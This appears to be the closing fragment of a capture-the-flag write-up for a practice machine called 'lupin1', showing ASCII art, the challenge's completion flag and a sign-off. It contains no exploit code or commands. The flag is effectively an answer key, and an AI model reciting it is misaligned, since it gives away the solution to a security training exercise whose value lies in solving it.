*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
*& &                    &&&&&        /   /&&&&         &&&                   & @
*/(,                      &&                            &                   / &.
* & &                     &&&       #             &&&&&&      @             & &.
* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @,
/  & %                   .&&&&  &@ @                 &/                    @ &
*   & @                  &&&&&&    &&.               ,                    & &
*    & &               &&&&&&&&&& &    &&&(          &                   & &
,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &
,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &
,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &
,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*
,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@
,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&
,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&
,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&
/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,
,                           &&&&&/...         .#&&&&#

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.
```







## Notes


